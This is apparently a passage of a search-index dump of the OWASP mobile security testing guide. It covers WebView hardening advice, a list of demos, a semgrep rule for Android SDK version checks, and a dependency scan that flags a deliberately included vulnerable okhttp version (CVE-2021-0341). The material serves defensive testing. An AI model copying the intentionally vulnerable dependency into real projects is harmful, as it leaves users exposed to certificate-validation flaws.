prevention, improve secure external storage)<ul> <li>Privacy (overview)</li> <li>Privacy (details 1)</li> <li>Privacy (details 2)</li> <li>Security (overview)</li> <li>Security (details)</li> </ul> </li> <li>Android 11 (API level 30) in September 2020 (scoped storage enforcement, Permissions auto-reset, reduced package visibility, APK Signature Scheme v4)<ul> <li>Privacy (overview)</li> <li>Privacy Behavior changes (all apps)</li> <li>Security Behavior changes (all apps)</li> <li>Privacy Behavior changes (apps targeting version)</li> <li>Security Behavior changes (apps targeting version)</li> </ul> </li> <li>Android 12 (API level 31-32) in August 2021 (Material You, Web intent resolution, Privacy Dashboard)<ul> <li>Security and privacy</li> <li>Behavior changes (all apps)</li> <li>Behavior changes (apps targeting version)</li> </ul> </li> <li>Android 13 (API level 33) in 2022 (Safer exporting of context-registered receivers, new photo picker)<ul> <li>Security and privacy</li> <li>Privacy Behavior changes (all apps)</li> <li>Security Behavior changes (all apps)</li> <li>Privacy Behavior changes (apps targeting version)</li> <li>Security Behavior changes (apps targeting version)</li> </ul> </li> <li>Android 14 (API level 34) in 2023:<ul> <li>Summary of changes</li> <li>Security Behavior changes (all apps)</li> <li>Security Behavior changes (apps targeting version)</li> </ul> </li> <li>Android 15 (API level 35) in 2024:<ul> <li>Summary of changes</li> <li>Security Behavior changes (all apps)</li> <li>Security Behavior changes (apps targeting version)</li> </ul> </li> <li>Android 16 (API level 36) in 2025 ( BETA):<ul> <li>Summary of changes</li> <li>Security Behavior changes (all apps)</li> <li>Security Behavior changes (apps targeting version)</li> </ul> </li> </ul>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0010/#tests","title":"Tests","text":"<p> MASTG-TEST-0253: Runtime Use of Local File Access APIs in WebViews  MASTG-TEST-0252: References to Local File Access in WebViews </p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0011/","title":"MASTG-BEST-0011: Securely Load File Content in a WebView","text":"<p>The recommended approach to load file content to a WebView securely is to use <code>WebViewClient</code> with <code>WebViewAssetLoader</code> to load assets from the app's assets or resources directory using <code>https://</code> URLs instead of insecure <code>file://</code> URLs. This ensures the content is loaded in a secure, same-origin environment and avoids exposing local files to potential cross-origin attacks.</p> <p>If you must allow the WebView to load local files using the <code>file://</code> scheme, consider the following:</p> <ul> <li> <p>For apps with a <code>minSdkVersion</code> that has secure defaults for WebView file access methods, ensure that these methods are not used and the default values are preserved. Alternatively, explicitly set them to <code>false</code> to guarantee the WebView does not allow local file access:</p> <ul> <li><code>setAllowFileAccess(false)</code></li> <li><code>setAllowFileAccessFromFileURLs(false)</code></li> <li><code>setAllowUniversalAccessFromFileURLs(false)</code></li> </ul> </li> <li> <p>For apps with a <code>minSdkVersion</code> that does not have secure defaults for these methods (e.g., older API levels), ensure that the above methods are explicitly set to <code>false</code> in your WebView configuration.</p> </li> </ul> <p>For more details, refer to the official Android documentation on loading local content securely, especially the section on \"Things to avoid\".</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0011/#tests","title":"Tests","text":"<p> MASTG-TEST-0251: Runtime Use of Content Provider Access APIs in WebViews  MASTG-TEST-0253: Runtime Use of Local File Access APIs in WebViews  MASTG-TEST-0252: References to Local File Access in WebViews  MASTG-TEST-0250: References to Content Provider Access in WebViews </p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0012/","title":"MASTG-BEST-0012: Disable JavaScript in WebViews","text":"<p>If JavaScript is not required, explicitly disable it in WebViews by setting <code>setJavaScriptEnabled(false)</code>.</p> <p>Enabling JavaScript in WebViews increases the attack surface and can expose your app to severe security risks, including:</p> <ul> <li>Cross-Site Scripting (XSS): Malicious JavaScript can execute within the WebView, leading to session hijacking, credential theft, or defacement.</li> <li>Data Exfiltration: WebViews can access sensitive data such as cookies, tokens, or local files (e.g., via <code>file://</code> or <code>content://</code> URIs when <code>setAllowFileAccess(true)</code>, <code>setAllowFileAccessFromFileURLs(true)</code>, or <code>setAllowContentAccess(true)</code> are enabled) which can be exfiltrated by malicious scripts if <code>setAllowUniversalAccessFromFileURLs(true)</code> is set.</li> <li>Unauthorized Device Access: JavaScript can be used in conjunction with <code>addJavascriptInterface</code> to exploit exposed native Android interfaces, leading to remote code execution (RCE).</li> </ul> <p>Sometimes this is not possible due to app requirements. In those cases, ensure that you have implemented proper input validation, output encoding, and other security measures.</p> <p>Note: sometimes you may want to use alternatives to regular WebViews, such as Trusted Web Activities or Custom Tabs, which provide a more secure way to display web content in your app. In those cases, JavaScript is handled within the browser environment, which benefits from the latest security updates, sandboxing, and mitigations against common web vulnerabilities such as Cross-Site Scripting (XSS) and Machine-in-the-Middle (MITM) attacks.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0012/#tests","title":"Tests","text":"<p> MASTG-TEST-0251: Runtime Use of Content Provider Access APIs in WebViews  MASTG-TEST-0253: Runtime Use of Local File Access APIs in WebViews  MASTG-TEST-0252: References to Local File Access in WebViews  MASTG-TEST-0250: References to Content Provider Access in WebViews </p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0013/","title":"MASTG-BEST-0013: Disable Content Provider Access in WebViews","text":"<p>Unlike other file content access methods from <code>WebSettings</code>, the <code>setAllowContentAccess</code> method always defaults to <code>true</code>. Therefore, whenever access to content providers isn't explicitly needed, ensure that the <code>setAllowContentAccess</code> method is set to <code>false</code> to prevent WebViews from accessing content providers.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0013/#why-is-this-important","title":"Why is this important?","text":"<p>Enabling content access in a WebView is not a vulnerability per se; it increases the number of ways an attacker could chain vulnerabilities. For example, if combined with an XSS or other injection vulnerability (or if the WebView is used to display untrusted remote content), it can allow an attacker to read sensitive data that they can send back to a remote server.</p> <p>Although there are many \"safeguards\" (such as CORS restrictions and the fact that a non-exported provider won't serve data to any external caller), the app's own content providers would be accessible even if they were not exported; they may have access to the app's private storage, both in internal and external storage. Also in some cases even other apps' files in shared/external storage, depending on the app permissions (e.g. <code>READ_MEDIA_IMAGES</code>, etc.).</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0013/#tests","title":"Tests","text":"<p> MASTG-TEST-0251: Runtime Use of Content Provider Access APIs in WebViews  MASTG-TEST-0250: References to Content Provider Access in WebViews </p>","tags":["android","best"]},{"location":"MASTG/demos/","title":"MASTG Demos","text":"About the MASTG Demos <p>Demos are write-ups that demonstrate the weakness in a sample application. They can be seen as a practical application of the tests.</p> <p>Each demo contains the following information:</p> <ul> <li>Overview: A brief description of the demo.</li> <li>Sample: A code snippet that demonstrates the weakness.</li> <li>Steps: The specific steps followed to identify the weakness in the sample code.</li> <li>Observation: A description of the results of running the test against the code.</li> <li>Evaluation: The evaluation of the results of the test explaining why it failed or passed.</li> </ul> <p>All demos in the MASTG are written in markdown and are located in the <code>demos</code> directory.</p> <p>Each demo directory contains the following files:</p> <ul> <li><code>MASTG-DEMO-****.md</code>: The markdown file containing the demo write-up.</li> <li><code>MastgTest.kt</code>: The Kotlin code snippet that demonstrates the weakness.</li> <li><code>output.txt</code>: The output of running the test against the code.</li> <li><code>run.sh</code>: The script that runs the test against the code.</li> </ul> <p>Depending on the test, the demo may contain additional files, such as configuration files or additional code snippets, scripts (e.g. in Python), or output files. The samples are written in Kotlin or Swift, depending on the platform. In some cases, the samples will also include configuration files such as <code>AndroidManifest.xml</code> or <code>Info.plist</code>.</p> <p>If the sample can be decompiled, the decompiled code is also provided in the demo. This is useful for understanding the code in the context of the application.</p> <p>Demos are required to be fully self-contained and should not rely on external resources or dependencies. This ensures that the demos can be run independently and that the results are reproducible. They must be proven to work on the provided sample applications and must be tested thoroughly before being included in the MASTG.</p> <p>MAS Test Apps</p> <p>In order for our new demos to be reliable and consistent, we needed to make sure that the results were reproducible and could be tested and validated. This is where the new MASTestApps came in. They are two very simple apps that mirror each other on Android and iOS. Demos must be implemented using these apps. This helps the reviewer and serves as a playground to create and practice your MAS skills.</p> <ul> <li>MASTestApp-Android</li> <li>MASTestApp-iOS</li> </ul> <p>Simply clone the repository and follow the instructions to run the apps on your local machine. Use them to validate the demos before submitting them to the MASTG.</p> IMPORTANT DISCLAIMER <p>Please read this disclaimer carefully as it contains essential information regarding the use of the Mobile Application Security Testing Guide (MASTG).</p> <ul> <li> <p>Scope and Purpose of MASTG Artifacts: Each new release of the MASTG will include a collection of testing resources such as Static Application Security Testing (SAST) rules, Dynamic Application Security Testing (DAST) scripts, and other relevant artifacts. However, it's crucial to understand that these resources are not intended to provide a comprehensive solution for all your security testing needs.</p> </li> <li> <p>Baseline: The resources provided in the MASTG serve as a baseline or starting point. They are designed to be used as references and learning tools in the field of mobile application security. While they offer valuable insights and guidelines, they should be used as a foundation upon which you can build and tailor your own specific automation and security testing processes.</p> </li> <li> <p>No Guarantee of Complete Coverage: The OWASP Mobile Application Security (MAS) project, the entity behind the MASTG, explicitly does not assume responsibility or guarantee that the provided code and resources will identify all possible vulnerabilities in mobile applications. Security testing is a complex and evolving field, and the effectiveness of any set of tools or rules varies depending on numerous factors, including the specific context of the application being tested, the experience of the tester, and the changing landscape of security threats.</p> </li> <li> <p>Potential for False Positives and Negatives: Users of the MASTG should be aware that the testing resources might generate a significant number of false positives (incorrectly identifying non-issues as vulnerabilities) and false negatives (failing to detect actual vulnerabilities). It is essential to approach the results with a critical and informed mindset, and supplement automated testing with manual review and analysis.</p> </li> <li> <p>Continuous Learning and Adaptation: The field of mobile application security is continuously evolving. As such, the MASTG resources should be seen as a living body of knowledge, subject to updates and improvements. Users are encouraged to stay informed about the latest security trends and techniques and to actively contribute to the evolution of these resources.</p> </li> </ul> <p>By using the MASTG, you acknowledge and agree to these limitations. It's recommended to combine the use of MASTG resources with other security practices and tools to achieve a more comprehensive and effective security testing strategy for your mobile applications.</p> ID Title Platform Test Status MASTG-DEMO-0027  Runtime Use of KeyguardManager.isDeviceSecure and BiometricManager.canAuthenticate APIs with Frida platform:android MASTG-TEST-0249 newstatus:new MASTG-DEMO-0038  Detecting StrictMode Uses with Frida platform:android MASTG-TEST-0264 newstatus:new MASTG-DEMO-0037  App Leaking Information about Unclosed SQL Cursor via StrictMode platform:android MASTG-TEST-0263 newstatus:new MASTG-DEMO-0028  Uses of KeyguardManager.isDeviceSecure and BiometricManager.canAuthenticate with semgrep platform:android MASTG-TEST-0247 newstatus:new MASTG-DEMO-0039  Detecting StrictMode PenaltyLog Usage with Semgrep platform:android MASTG-TEST-0265 newstatus:new MASTG-DEMO-0009  Detecting Sensitive Data in Network Traffic platform:android MASTG-TEST-0206 newstatus:new MASTG-DEMO-0033  Dangerous Permissions in the AndroidManifest with semgrep platform:android MASTG-TEST-0254 newstatus:new MASTG-DEMO-0025  Uses of Build.VERSION.SDK_INT with semgrep platform:android MASTG-TEST-0245 newstatus:new MASTG-DEMO-0050  Identifying Insecure Dependencies in Android Studio platform:android MASTG-TEST-0272 newstatus:new MASTG-DEMO-0051  Identifying Insecure Dependencies through SBOM Creation platform:android MASTG-TEST-0272 newstatus:new MASTG-DEMO-0049  SSLSocket Connection to Wrong Host Server Blocked by HostnameVerifier platform:android MASTG-TEST-0234 newstatus:new MASTG-DEMO-0055  Use of the HostnameVerifier that Allows Any Hostname platform:android MSTG-TEST-0283 newstatus:new MASTG-DEMO-0057  Network Security Configuration Allows User-Added Certificates platform:android MSTG-TEST-0286 newstatus:new MASTG-DEMO-0048  SSLSocket Connection to Wrong Host Server Allowed by Lack of HostnameVerifier platform:android MASTG-TEST-0234 newstatus:new MASTG-DEMO-0056  WebView Ignoring TLS Errors in onReceivedSslError platform:android MSTG-TEST-0284 newstatus:new MASTG-DEMO-0054  Use of a TrustManager that Does Not Validate Certificate Chains platform:android MSTG-TEST-0282 newstatus:new MASTG-DEMO-0032  Uses of WebViews Allowing Local File Access with semgrep platform:android MASTG-TEST-0252 newstatus:new MASTG-DEMO-0031  Uses of WebViews Allowing Local File Access with Frida platform:android MASTG-TEST-0253 newstatus:new MASTG-DEMO-0030  Uses of WebViews Allowing Content Access with Frida platform:android MASTG-TEST-0251 newstatus:new MASTG-DEMO-0029  Uses of WebViews Allowing Content Access with semgrep platform:android MASTG-TEST-0250 newstatus:new MASTG-DEMO-0040  Debuggable Flag Enabled in the AndroidManifest with semgrep platform:android MASTG-TEST-0226 newstatus:new MASTG-DEMO-0002  External Storage APIs Tracing with Frida platform:android MASTG-TEST-0201 newstatus:new MASTG-DEMO-0035  Data Exclusion using backup_rules.xml with adb backup platform:android MASTG-TEST-0216 newstatus:new MASTG-DEMO-0010  File System Snapshots from Internal Storage platform:android MASTG-TEST-0207 newstatus:new MASTG-DEMO-0034  Backup and Restore App Data with semgrep platform:android MASTG-TEST-0262 newstatus:new MASTG-DEMO-0006  Tracing Common Logging APIs Looking for Secrets platform:android MASTG-TEST-0203 newstatus:new MASTG-DEMO-0060  App Writing Sensitive Data to Sandbox using EncryptedSharedPreferences platform:android MASTG-TEST-0287 placeholderstatus:placeholder MASTG-DEMO-0003  App Writing to External Storage without Scoped Storage Restrictions platform:android MASTG-TEST-0202 newstatus:new MASTG-DEMO-0020  Data Exclusion using backup_rules.xml with Backup Manager platform:android MASTG-TEST-0216 newstatus:new MASTG-DEMO-0024  Uses of Caching UI Elements with semgrep platform:android MASTG-TEST-0258 newstatus:new MASTG-DEMO-0001  File System Snapshots from External Storage platform:android MASTG-TEST-0200 newstatus:new MASTG-DEMO-0004  App Writing to External Storage with Scoped Storage Restrictions platform:android MASTG-TEST-0202 newstatus:new MASTG-DEMO-0005  App Writing to External Storage via the MediaStore API platform:android MASTG-TEST-0202 newstatus:new MASTG-DEMO-0012  Cryptographic Key Generation With Insufficient Key Length platform:android MASTG-TEST-0208 newstatus:new MASTG-DEMO-0022  Uses of Broken Symmetric Encryption Algorithms in Cipher with semgrep platform:android MASTG-TEST-0221 newstatus:new MASTG-DEMO-0017  Use of Hardcoded AES Key in SecretKeySpec with semgrep platform:android MASTG-TEST-0212 newstatus:new MASTG-DEMO-0007  Common Uses of Insecure Random APIs platform:android MASTG-TEST-0204 newstatus:new MASTG-DEMO-0023  Uses of Broken Encryption Modes in Cipher with semgrep platform:android MASTG-TEST-0232 newstatus:new MASTG-DEMO-0008  Uses of Non-random Sources platform:android MASTG-TEST-0205 newstatus:new MASTG-DEMO-0036  Debuggable Entitlement Enabled in the entitlements.plist with rabin2 platform:ios MASTG-TEST-0261 newstatus:new MASTG-DEMO-0026  Runtime Use of LAContext.canEvaluatePolicy with Frida platform:ios MASTG-TEST-0246 newstatus:new MASTG-DEMO-0021  Uses of Jailbreak Detection Techniques with r2 platform:ios MASTG-TEST-0240 newstatus:new MASTG-DEMO-0024  Uses of Caching UI Elements with semgrep platform:ios MASTG-TEST-0248 newstatus:new MASTG-DEMO-0053  Identifying Insecure Dependencies in SwiftPM through SBOM creation platform:ios MASTG-TEST-0273 newstatus:new MASTG-DEMO-0052  Scanning Package Manager Artifacts for Insecure iOS Dependencies platform:ios MASTG-TEST-0273 newstatus:new MASTG-DEMO-0019  Uses of isExcludedFromBackupKey with r2 platform:ios MASTG-TEST-0215 newstatus:new MASTG-DEMO-0041  Uses of LAContext.evaluatePolicy with r2 platform:ios MASTG-TEST-0266 newstatus:new MASTG-DEMO-0044  Runtime Use of kSecAccessControlUserPresence with Frida platform:ios MASTG-TEST-0269 newstatus:new MASTG-DEMO-0047  Runtime Use of the Keychain Not Requiring User Presence with Frida platform:ios MASTG-TEST-0266 placeholderstatus:placeholder MASTG-DEMO-0046  Runtime Use of kSecAccessControlBiometryCurrentSet with Frida platform:ios MASTG-TEST-0271 newstatus:new MASTG-DEMO-0045  Uses of kSecAccessControlBiometryCurrentSet with r2 platform:ios MASTG-TEST-0270 newstatus:new MASTG-DEMO-0043  Uses of kSecAccessControlUserPresence with r2 platform:ios MASTG-TEST-0268 newstatus:new MASTG-DEMO-0042  Runtime Use of LAContext.evaluatePolicy with Frida platform:ios MASTG-TEST-0267 newstatus:new MASTG-DEMO-0013  Use of Hardcoded RSA Private Key in SecKeyCreateWithData with r2 platform:ios MASTG-TEST-0213 newstatus:new MASTG-DEMO-0015  Uses of Broken Hashing Algorithms in CommonCrypto with r2 platform:ios MASTG-TEST-0211 newstatus:new MASTG-DEMO-0014  Use of Hardcoded ECDSA Private Key in CryptoKit with r2 platform:ios MASTG-TEST-0213 newstatus:new MASTG-DEMO-0016  Uses of Broken Hashing Algorithms in CryptoKit with r2 platform:ios MASTG-TEST-0211 newstatus:new MASTG-DEMO-0018  Uses of Broken Encryption Algorithms in CommonCrypto with r2 platform:ios MASTG-TEST-0210 newstatus:new MASTG-DEMO-0011  Uses of Insufficient Key Size in SecKeyCreateRandomKey with r2 platform:ios MASTG-TEST-0209 newstatus:new <p></p>","tags":[]},{"location":"MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0025/MASTG-DEMO-0025/","title":"MASTG-DEMO-0025: Uses of Build.VERSION.SDK_INT with semgrep","text":"<p>  Download MASTG-DEMO-0025 APK   Open MASTG-DEMO-0025 Folder  Build MASTG-DEMO-0025 APK</p>","tags":["android","demo","MASTG-TEST-0245"]},{"location":"MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0025/MASTG-DEMO-0025/#sample","title":"Sample","text":"<p>The following sample uses the <code>Build.VERSION.SDK_INT</code> API to check the operating system version.</p> MastgTest.ktMastgTest_reversed.java <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String {\n        val androidSdkVersion = getSystemSdkVersion()\n        return \"AndroidSdkVersion:$androidSdkVersion\\n\"\n    }\n\n    fun getSystemSdkVersion(): Int {\n        return android.os.Build.VERSION.SDK_INT\n    }\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.content.Context;\nimport android.os.Build;\nimport kotlin.Metadata;\nimport kotlin.jvm.internal.Intrinsics;\n\n/* compiled from: MastgTest.kt */\n@Metadata(m69d1 = {\"\\u0000\\u001e\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0002\\n\\u0002\\u0010\\b\\n\\u0000\\n\\u0002\\u0010\\u000e\\n\\u0000\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\r\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0002\\u0010\\u0004J\\u0006\\u0010\\u0005\\u001a\\u00020\\u0006J\\u0006\\u0010\\u0007\\u001a\\u00020\\bR\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\t\"}, m70d2 = {\"Lorg/owasp/mastestapp/MastgTest;\", \"\", \"context\", \"Landroid/content/Context;\", \"(Landroid/content/Context;)V\", \"getSystemSdkVersion\", \"\", \"mastgTest\", \"\", \"app_debug\"}, m71k = 1, m72mv = {1, 9, 0}, m74xi = 48)\n/* loaded from: classes4.dex */\npublic final class MastgTest {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTest(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final String mastgTest() {\n        int androidSdkVersion = getSystemSdkVersion();\n        return \"AndroidSdkVersion:\" + androidSdkVersion + '\\n';\n    }\n\n    public final int getSystemSdkVersion() {\n        return Build.VERSION.SDK_INT;\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0245"]},{"location":"MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0025/MASTG-DEMO-0025/#steps","title":"Steps","text":"<p>Let's run  semgrep rules against the sample code.</p> ../../../../rules/mastg-android-sdk-version.yml<pre><code>rules:\n  - id: mastg-android-sdk-version\n    languages:\n      - java\n    severity: WARNING\n    metadata:\n      summary: This rule scans for API that checks the version of the operating system\n    message: \"[MASVS-PLATFORM] Make sure to verify that your app runs on a device with an up-to-date OS version to make sure it satisfy your security requirements\"\n    patterns:\n      - pattern: Build.VERSION.SDK_INT\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-sdk-version.yml ./MastgTest_reversed.java --text -o output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0245"]},{"location":"MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0025/MASTG-DEMO-0025/#observation","title":"Observation","text":"<p>The output file shows usages of the API that verifies the operating system version.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 1 Code Finding \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTest_reversed.java\n    \u276f\u2771 \u001b[1mrules.mastg-android-sdk-version\u001b[0m\n          [MASVS-PLATFORM] Make sure to verify that your app runs on a device with an up-to-date OS\n          version to make sure it satisfy your security requirements                               \n\n           26\u2506 return Build.VERSION.SDK_INT;\n</code></pre>","tags":["android","demo","MASTG-TEST-0245"]},{"location":"MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0025/MASTG-DEMO-0025/#evaluation","title":"Evaluation","text":"<p>The test passes because the output shows references to SDK version check API.</p>","tags":["android","demo","MASTG-TEST-0245"]},{"location":"MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0050/MASTG-DEMO-0050/","title":"MASTG-DEMO-0050: Identifying Insecure Dependencies in Android Studio","text":"<p>  Download MASTG-DEMO-0050 APK   Open MASTG-DEMO-0050 Folder  Build MASTG-DEMO-0050 APK</p>","tags":["android","demo","MASTG-TEST-0272"]},{"location":"MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0050/MASTG-DEMO-0050/#sample","title":"Sample","text":"build.gradle.kts<pre><code>plugins {\n    id(\"com.android.application\")\n    id(\"org.jetbrains.kotlin.android\")\n    id(\"org.owasp.dependencycheck\") version \"10.0.4\" // dependencyCheck Plugin\n}\n\n// dependencyCheck Configuration\ndependencyCheck {\n\n    formats = listOf(\"HTML\", \"XML\", \"JSON\") // Generate reports in HTML, JSON and XML format\n    nvd {\n        apiKey = \"&lt;YOUR-API-KEY&gt;\" // Set the NVD API key\n        delay = 16000\n    }\n\n}\n\nandroid {\n    namespace = \"org.owasp.mastestapp\"\n    compileSdk = 34\n\n    defaultConfig {\n        applicationId = \"org.owasp.mastestapp\"\n        minSdk = 29\n        targetSdk = 34\n        versionCode = 1\n        versionName = \"1.0\"\n\n        testInstrumentationRunner = \"androidx.test.runner.AndroidJUnitRunner\"\n        vectorDrawables {\n            useSupportLibrary = true\n        }\n    }\n\n    buildTypes {\n        release {\n            isMinifyEnabled = false\n            proguardFiles(\n                getDefaultProguardFile(\"proguard-android-optimize.txt\"),\n                \"proguard-rules.pro\"\n            )\n        }\n    }\n    compileOptions {\n        sourceCompatibility = JavaVersion.VERSION_1_8\n        targetCompatibility = JavaVersion.VERSION_1_8\n    }\n    kotlinOptions {\n        jvmTarget = \"1.8\"\n    }\n    buildFeatures {\n        compose = true\n    }\n    composeOptions {\n        kotlinCompilerExtensionVersion = \"1.5.1\"\n    }\n    packaging {\n        resources {\n            excludes += \"/META-INF/{AL2.0,LGPL2.1}\"\n        }\n    }\n}\n\ndependencies {\n\n    implementation(\"androidx.core:core-ktx:1.12.0\")\n    implementation(\"androidx.lifecycle:lifecycle-runtime-ktx:2.7.0\")\n    implementation(\"androidx.activity:activity-compose:1.8.2\")\n    implementation(platform(\"androidx.compose:compose-bom:2024.04.00\"))\n    implementation(\"androidx.compose.ui:ui\")\n    implementation(\"androidx.compose.ui:ui-graphics\")\n    implementation(\"androidx.compose.ui:ui-tooling-preview\")\n    implementation(\"androidx.compose.material3:material3\")\n    testImplementation(\"junit:junit:4.13.2\")\n    androidTestImplementation(\"androidx.test.ext:junit:1.1.5\")\n    androidTestImplementation(\"androidx.test.espresso:espresso-core:3.5.1\")\n    androidTestImplementation(platform(\"androidx.compose:compose-bom:2024.04.00\"))\n    androidTestImplementation(\"androidx.compose.ui:ui-test-junit4\")\n    debugImplementation(\"androidx.compose.ui:ui-tooling\")\n    debugImplementation(\"androidx.compose.ui:ui-test-manifest\")\n    implementation(\"org.jetbrains.kotlin:kotlin-reflect:1.9.10\")\n    implementation (\"com.squareup.okhttp3:okhttp:4.9.1\") // vulnerable library\n\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0272"]},{"location":"MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0050/MASTG-DEMO-0050/#steps","title":"Steps","text":"<p>Execute <code>gradle</code> in Android Studio to trigger  dependency-check.</p> run.sh<pre><code>./gradlew dependencyCheckAnalyze\n</code></pre>","tags":["android","demo","MASTG-TEST-0272"]},{"location":"MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0050/MASTG-DEMO-0050/#observation","title":"Observation","text":"<p>The scan identified 303 unique dependencies, four of which are vulnerable, as well as five vulnerabilities. More vulnerabilities may be found over time, so this number may increase. If you have used the <code>suppress.xml</code> file, there are 57 suppressed vulnerabilities.</p> output.txt<pre><code>...\n[redacted for readability]\n...\n        {\n            \"isVirtual\": false,\n            \"fileName\": \"okhttp-4.9.1.jar\",\n            \"filePath\": \"\\/Users\\/sushi2k\\/.gradle\\/caches\\/modules-2\\/files-2.1\\/com.squareup.okhttp3\\/okhttp\\/4.9.1\\/51215279c3fe472c59b6b7dd7491e6ac2e28a81b\\/okhttp-4.9.1.jar\",\n            \"md5\": \"018ce5d28ab7958a1f0bb93b35215ef6\",\n            \"sha1\": \"51215279c3fe472c59b6b7dd7491e6ac2e28a81b\",\n            \"sha256\": \"6afdd8f35f4eb60df965c290fa3acf29443fa986545113d0729b8461f6571f8f\",\n            \"description\": \"Square\\u2019s meticulous HTTP client for Java and Kotlin.\",\n            \"license\": \"The Apache Software License, Version 2.0: http:\\/\\/www.apache.org\\/licenses\\/LICENSE-2.0.txt\",\n...\n[redacted for readability]\n...\n            \"packages\": [\n                {\n                    \"id\": \"pkg:maven\\/com.squareup.okhttp3\\/okhttp@4.9.1\",\n                    \"confidence\": \"HIGH\",\n                    \"url\": \"https:\\/\\/ossindex.sonatype.org\\/component\\/pkg:maven\\/com.squareup.okhttp3\\/okhttp@4.9.1?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.1\"\n                }\n            ],\n             \"vulnerabilityIds\": [\n                {\n                    \"id\": \"cpe:2.3:a:squareup:okhttp:4.9.1:*:*:*:*:*:*:*\",\n                    \"confidence\": \"HIGHEST\",\n                    \"url\": \"https:\\/\\/nvd.nist.gov\\/vuln\\/search\\/results?form_type=Advanced&amp;results_type=overview&amp;search_type=all&amp;cpe_vendor=cpe%3A%2F%3Asquareup&amp;cpe_product=cpe%3A%2F%3Asquareup%3Aokhttp&amp;cpe_version=cpe%3A%2F%3Asquareup%3Aokhttp%3A4.9.1\"\n                },\n                {\n                    \"id\": \"cpe:2.3:a:squareup:okhttp3:4.9.1:*:*:*:*:*:*:*\",\n                    \"confidence\": \"HIGHEST\",\n                    \"url\": \"https:\\/\\/nvd.nist.gov\\/vuln\\/search\\/results?form_type=Advanced&amp;results_type=overview&amp;search_type=all&amp;cpe_vendor=cpe%3A%2F%3Asquareup&amp;cpe_product=cpe%3A%2F%3Asquareup%3Aokhttp3&amp;cpe_version=cpe%3A%2F%3Asquareup%3Aokhttp3%3A4.9.1\"\n                }\n            ],\n            \"vulnerabilities\": [\n                {\n                    \"source\": \"OSSINDEX\",\n                    \"name\": \"CVE-2021-0341\",\n                    \"severity\": \"HIGH\",\n                    \"cvssv3\": {\n                        \"baseScore\": 7.5,\n                        \"attackVector\": \"NETWORK\",\n                        \"attackComplexity\": \"LOW\",\n                        \"privilegesRequired\": \"NONE\",\n                        \"userInteraction\": \"NONE\",\n                        \"scope\": \"UNCHANGED\",\n                        \"confidentialityImpact\": \"HIGH\",\n                        \"integrityImpact\": \"NONE\",\n                        \"availabilityImpact\": \"NONE\",\n                        \"baseSeverity\": \"HIGH\",\n                        \"version\": \"3.1\"\n                    },\n                    \"cwes\": [\n                        \"CWE-295\"\n                    ],\n                    \"description\": \"In verifyHostName of OkHostnameVerifier.java, there is a possible way to accept a certificate for the wrong domain due to improperly used crypto. This could lead to remote information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-8.1 Android-9 Android-10 Android-11Android ID: A-171980069\\n\\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\\/\\/ossindex.sonatype.org\\/vulnerability\\/CVE-2021-0341 for details\",\n                    \"notes\": \"\",\n                    \"references\": [\n                        {\n                            \"source\": \"OSSIndex\",\n                            \"url\": \"https:\\/\\/source.android.com\\/security\\/bulletin\\/2021-02-01#android-runtime\",\n                            \"name\": \"https:\\/\\/source.android.com\\/security\\/bulletin\\/2021-02-01#android-runtime\"\n                        },\n                        {\n                            \"source\": \"OSSINDEX\",\n                            \"url\": \"https:\\/\\/ossindex.sonatype.org\\/vulnerability\\/CVE-2021-0341?component-type=maven&amp;component-name=com.squareup.okhttp3%2Fokhttp&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.1\",\n                            \"name\": \"[CVE-2021-0341] CWE-295: Improper Certificate Validation\"\n                        },\n                        {\n                            \"source\": \"OSSIndex\",\n                            \"url\": \"http:\\/\\/web.nvd.nist.gov\\/view\\/vuln\\/detail?vulnId=CVE-2021-0341\",\n                            \"name\": \"http:\\/\\/web.nvd.nist.gov\\/view\\/vuln\\/detail?vulnId=CVE-2021-0341\"\n                        },\n                        {\n                            \"source\": \"OSSIndex\",\n                            \"url\": 